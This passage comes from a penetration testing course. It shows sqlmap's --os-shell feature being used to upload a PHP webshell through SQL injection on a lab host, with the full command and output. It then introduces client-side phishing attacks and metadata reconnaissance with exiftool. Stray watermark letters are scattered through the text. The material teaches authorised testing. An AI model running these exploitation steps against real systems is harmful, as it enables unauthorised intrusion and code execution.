k
Since we’re dealing with a blind time-based SQLi vulnerability, the process of fetching the entire
database’s table is quite slow, but eventually we manage to obtain all users’ hashed credentials.
s
Another sqlmap core feature is the --os-shell parameter, which provides us with a full interactive
shell. o
Due to their generally high latency, time-based blind SQLi are not ideal when interacting with a
shell, so we’ll use the first UNION-based SQnLi example.
First, we need to intercept the POST request via Burp and save it as a local text file on our Kali
i
VM.
z
POST /search.php HTTP/1.1
Host: 192.168.50.19
D
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.50.19
Connection: close
Referer: http://192.168.50.19/search.php
Cookie: PHPSESSID=vchu1sfs34oosl52l7pb1kag7d
Upgrade-Insecure-Requests: 1
item=test
Listing 209 - Intercepting the POST request with Burp
Next, we can invoke sqlmap with the -r parameter, using our file containing the POST request as
an argument. We also need to indicate which parameter is vulnerable to sqlmap, in our case item.
Finally, we’ll include --os-shell along with the custom writable folder we found earlier.
kali@kali:~$ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
...
[*] starting @ 02:20:47 PM /2022-05-19/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 311
Made in Morocco
Penetration Testing with Kali Linux
[14:20:47] [INFO] parsing HTTP request from 'post'
[14:20:47] [INFO] resuming back-end DBMS 'mysql'
[14:20:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: item (POST)
...
---
[14:20:48] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.6
[14:20:48] [INFO] going to use a web backdoor for command prompt
[14:20:48] [INFO] fingerprinting the back-end DBMS operating system
[14:20:48] [INFO] the back-end DBMS operating system is Linux
which web application language does the web server support? y
[1] ASP
[2] ASPX
[3] JSP k
[4] PHP (default)
> 4
s
[14:20:49] [INFO] using '/var/www/html/tmp' as web server document root
[14:20:49] [INFO] retrieved web server absolute paths: '/var/www/html/search.php'
[14:20:49] [INFO] trying to upload the file sotager on '/var/www/html/tmp/' via LIMIT
'LINES TERMINATED BY' method
[14:20:50] [WARNING] unable to upload the file stager on '/var/www/html/tmp/'
[14:20:50] [INFO] trying to upload the nfile stager on '/var/www/html/tmp/' via UNION
method
[14:20:50] [WARNING] expect junk characters inside the file as a leftover from UNION
query i
[14:20:50] [INFO] the remote fzile '/var/www/html/tmp/tmpuqgek.php' is larger (713 B)
than the local file '/tmp/sqlmapxkydllxb82218/tmp3d64iosz' (709B)
[14:20:51] [INFO] the file stager has been successfully uploaded on
D
'/var/www/html/tmp/' - http://192.168.50.19:80/tmp/tmpuqgek.php
[14:20:51] [INFO] the backdoor has been successfully uploaded on '/var/www/html/tmp/'
- http://192.168.50.19:80/tmp/tmpbetmz.php
[14:20:51] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> pwd
do you want to retrieve the command standard output? [Y/n/a] y
command standard output: '/var/www/html/tmp'
Listing 210 - Running sqlmap with os-shell
Once sqlmap confirms the vulnerability, it prompts us for the language the web application is
written in, which is PHP in this case. Next, sqlmap uploads the webshell to the specified web
folder and returns the interactive shell, from which we can issue regular system commands.
10.4 Wrapping Up
In this Module, we focused on identifying and enumerating SQL injection vulnerabilities. We
explored the different payloads that can be leveraged to abuse these web application
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 312
Made in Morocco
Penetration Testing with Kali Linux
vulnerabilities and discovered how to achieve code execution manually. Finally, we learned how to
automate the entire attack chain using sqlmap.
y
k
s
o
n
i
z
D
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 313
Made in Morocco
Penetration Testing with Kali Linux
11 Client-side Attacks
In this Learning Module, we will cover the following Learning Units:
• Target Reconnaissance
• Exploiting Microsoft Office
• Abusing Windows Library Files
In penetration tests, we may be tasked by a client to breach the perimeter of their enterprise and
obtain an initial foothold inside the network. With the traditional attack model, we would
enumerate the client’s accessible machines and attempt to exploit their services. However,
overcoming the perimeter by exploiting technical vulnerabilities has become increasingly rare and
difficult according to a report467 from Verizon.468 The report states ty hat Phishing469 is the second
largest attack vector used for breaching a perimeter, only surpassed by credential attacks.
k
Phishing often leverages client-side attacks. This type of attack works by delivering malicious files
directly to users. Once they execute these files on their machine, we can get a foothold in the
s
internal network. Client-side attacks often exploit weaknesses or functions in local software and
applications such as browsers, operating system components, or office programs. To execute
malicious code on the client’s system, we must ofoten persuade, trick, or deceive the target user.
This concept of deception is an important one for us to consider as penetration testers. It raises
n
the question, who exactly are we deceiving? Who are we trying to persuade? Client-side attacks
allow us the opportunity to contemplate the vulnerabilities, biases and fragility inherent to people,
and not just computers or networks. This implies that to become the best possible attackers we
i
must not only be adept at technical skills like system administration and networking (for
z
example), but also develop knowledge about human psychology, corporate culture and social
norms.
D
When we leverage client-side attacks in penetration tests, we must also consider the moral
aspect of targeting users. Our goal should not only be to obtain code execution on their system,
but also to not overstep any ethical or legal boundaries such as blackmailing employees or
impersonating the police.
Since the client’s machine in an internal enterprise network is not usually a directly-accessible
system, and since it does not often offer externally-exposed services, this kind of attack vector is
hard to mitigate and especially insidious. These kind of attacks have encouraged the
implementation of new defense paradigms.
Client-side attacks often use specific delivery mechanisms and payload combinations, including
email attachments or links to malicious websites or files. We could even leverage more advanced
delivery mechanisms such as USB Dropping470 or watering hole attacks.471
467 (Verizon, 2022), https://www.verizon.com/business/resources/reports/2022/dbir/2022-data-breach-investigations-report-dbir.pdf
468 (Verizon, 2022), https://www.verizon.com/
469 (Microsoft Support, 2022), https://support.microsoft.com/en-au/windows/protect-yourself-from-phishing-0c7ea947-ba98-3bd9-
7184-430e1f860a44
470 (Tripwire, 2016), https://www.tripwire.com/state-of-security/featured/does-dropping-malicious-usb-sticks-really-work-yes-
worryingly-well/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 314
Made in Morocco
Penetration Testing with Kali Linux
Regardless of which delivery mechanism we choose, we must often deliver our payload to a
target on a non-routable internal network, since client systems are rarely exposed externally.
It has become increasingly difficult to deliver payloads via email due to spam
filters, firewalls, and other security technologies scanning emails for links and
attachments.
When choosing an attack vector and payload, we must first perform reconnaissance to determine
the operating system of the target as well as any installed applications. This is a critical first step,
as our payload must match the capability of the target. For example, if the target is running the
Windows operating system, we can use a variety of client-side attacks like malicious JScript472
code executed through the Windows Script Host473 or .lnk474 shortcyut files pointing to malicious
resources. If the target has installed Microsoft Office, we could leverage documents with
embedded malicious macros.
k
In this Module, we’ll learn how to perform reconnaissance against a target, walk through
exploitation scenarios involving malicious Microsoft Osffice documents, and leverage Windows
Library files.475
o
11.1 Target Reconnaissance
n
This Learning Unit covers the following Learning Objectives:
• Gather information to prepare client-side attacks
i
• Leverage client fingerprintingz to obtain information
Before we execute a client-side attack, it’s crucial that we identify potential users to target and
D
gather as much detailed information as possible about their operating system and installed
application software. This helps us improve our chances of a successful attack. We can identify
these users by browsing the company website and search for points of contact or use passive
information gathering techniques to find employees on social media.
Unlike traditional network reconnaissance performed against a target system, we do not often
have a direct connection to the target of a client-side attack. Instead, we must use a more tailored
and creative approach.
In this Learning Unit, we’ll explore these unique information gathering techniques and discuss
social engineering vectors designed to effectively enumerate the details of the target system.
471 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Watering_hole_attack
472 (Wikipedia, 2021), https://en.wikipedia.org/wiki/JScript
473 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Windows_Script_Host
474 (ForensicsWiki, 2021), https://web.archive.org/web/20220519184752/https://forensicswiki.xyz/page/LNK
475 (Windows Documentation, 2021), https://docs.microsoft.com/en-us/windows/client-management/windows-libraries
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 315
Made in Morocco
Penetration Testing with Kali Linux
11.1.1 Information Gathering
In this section, we’ll discuss various methods of enumerating a target’s installed software without
interacting with the target machine. These techniques are best-suited for situations in which we
have no way to interact with the target. Since we are not interacting with the target, we won’t alert
monitoring systems or leave forensic traces of our inquiry.
One approach is to inspect the metadata tags476 of publicly-available documents associated with
the target organization. Although this data can be manually sanitized, it often is not. These tags
(categorized by tag groups477) can include a variety of information about a document including
author, creation date, the name and version of the software used to create the document,
operating system of the client, and much more.
In some cases, this information is stored explicitly in the metadata, and in some cases it is
inferred, but either way the information can be quite revealing, helyping us to build an accurate
profile of software installed on clients in a target organization. Bear in mind that our findings may
be outdated if we are inspecting older documents. In addition, different branches of the
k
organization may use slightly different software.
Although this is a “hands-off” approach to data gatherinsg, the trade-off is that we may not gather
accurate information. Still, this approach is viable and effective.
o
Let’s review some sample documents so we can demonstrate metadata analysis.
We’ll leverage some of the techniques we learned in the Information Gathering Module. For
n
example, we can use the site:example.com filetype:pdf Google dork to find PDF files on a target’s
web page. If we want to target a specific branch or location, we can add that information via
keywords to narrow the results. i
z
If we want to interact with the target’s web site, we could also use tools like gobuster478 with the -x
parameter to search for specific file extensions on the target’s web site. This is noisy and will
D
generate log entries on the target. We can also simply browse the target website for other
specific information useful in a client-side attack, but we won’t delve into that subject in this
section.
Let’s practice searching for and retrieving documents from the Mountain Vegetables website.
We’ll open Firefox and navigate to http://192.168.50.197.
476 (Exiftool, 2022), https://exiftool.org/TagNames/
477 (Exiftool, 2022), https://exiftool.org/#Tag%20Groups
478 (Github, 2021), https://github.com/OJ/gobuster
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 316
Made in Morocco
Penetration Testing with Kali Linux
y
Figure 164: Mountain Vegetables Single Page Application
k
Figure 164 shows the website’s landing page. The text on the site states that the website is
currently under development. Scrolling through the pages and hovering over buttons, we find a link
to download a brochure.
o
n
i
z
D
Figure 165: Download PDF Brochure
Once we click CURRENT, Firefox opens the document in a new tab where we can download it.
To display the metadata of any supported file,479 we can use exiftool.480 Let’s provide the
arguments -a to display duplicated tags and -u to display unknown tags along with the filename
brochure.pdf:
kali@kali:~$ cd Downloads
479 (Exiftool, 2022), https://exiftool.org/#supported
480 (Exiftool, 2022), https://exiftool.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 317
Made in Morocco
Penetration Testing with Kali Linux
kali@kali:~/Downloads$ exiftool -a -u brochure.pdf
ExifTool Version Number : 12.41
File Name : brochure.pdf
Directory : .
File Size : 303 KiB
File Modification Date/Time : 2022:04:27 03:27:39-04:00
File Access Date/Time : 2022:04:28 07:56:58-04:00
File Inode Change Date/Time : 2022:04:28 07:56:58-04:00
File Permissions : -rw-------
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.7
Linearized : No
Page Count : 4
Language : en-US y
Tagged PDF : Yes
XMP Toolkit : Image::ExifTool 12.41
Creator : Stanley Yelnats k
Title : Mountain Vegetables
Author : Stanley Yelnats
s
Producer : Microsoft® PowerPoint® for Microsoft 365
Create Date : 2022:04:27 07:34:01+02:00
Creator Tool : Microsoft® oPowerPoint® for Microsoft 365
Modify Date : 2022:04:27 07:34:01+02:00
Document ID : uuid:B6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Instance ID : uuid:nB6ED3771-D165-4BD4-99C9-A15FA9C3A3CF
Title : Mountain Vegetables
Author : Stanley Yelnats
Create Date i: 2022:04:27 07:34:01+02:00
Modify Date z : 2022:04:27 07:34:01+02:00
Producer : Microsoft® PowerPoint® for Microsoft 365
Creator : Stanley Yelnats
D
Listing 211 - Displaying the metadata for brochure.pdf
This generated a lot of output. For us, the most important information includes the file creation
date, last modified date, the author’s name, the operating system, and the application used to
create the file.
The Create Date and Modify Date sections reveal the relative age of the document. Given that
these dates are relatively recent (at the time of this writing) we have a high level of trust that this